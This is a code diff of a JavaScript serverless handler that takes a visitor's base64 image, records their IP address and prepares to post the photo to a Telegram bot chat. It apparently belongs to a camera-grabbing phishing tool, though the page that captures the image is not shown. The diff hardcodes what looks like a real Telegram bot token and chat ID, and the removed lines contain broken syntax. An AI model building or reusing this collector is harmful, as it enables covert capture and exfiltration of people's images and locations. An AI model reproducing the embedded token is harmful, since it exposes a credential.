@@ -12,25 +12,20 @@ export default async function handler(req, res) {
     const dataUrl = body?.image;
     if (!dataUrl) return res.status(400).json({ ok: false, error: 'No image' });
 
-    // ambil IP pengunjung
     const xff = req.headers['x-forwarded-for'] || '';
     const clientIp = xff.split(',')[0].trim() || req.socket.remoteAddress || '';
 
-    // decode base64 dataURL
     const matches = dataUrl.match(/^data:(.+);base64,(.+)$/);
     if (!matches) return res.status(400).json({ ok: false, error: 'Invalid dataURL' });
+
     const mime = matches[1];
     const base64 = matches[2];
     const buffer = Buffer.from(base64, 'base64');
 
-    const BOT_TOKEN = process.env.8599132476:AAFbhY9f4Eo-VvnuhwgJD8erb89bYgMgQyU;
-    const CHAT_ID = process.env.8599132476;
+    // <-- Langsung di hardcode (untuk testing) -->
+    const BOT_TOKEN = '8599132476:AAFbhY9f4Eo-VvnuhwgJD8erb89bYgMgQyU';
+    const CHAT_ID   = '8599132476';
 
-    if (!BOT_TOKEN || !CHAT_ID) {
-      return res.status(500).json({ ok: false, error: 'Bot token / chat id not configured' });
-    }
-
-    // siapkan form-data untuk Telegram API
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('photo', buffer, { filename: 'photo.jpg', contentType: mime });
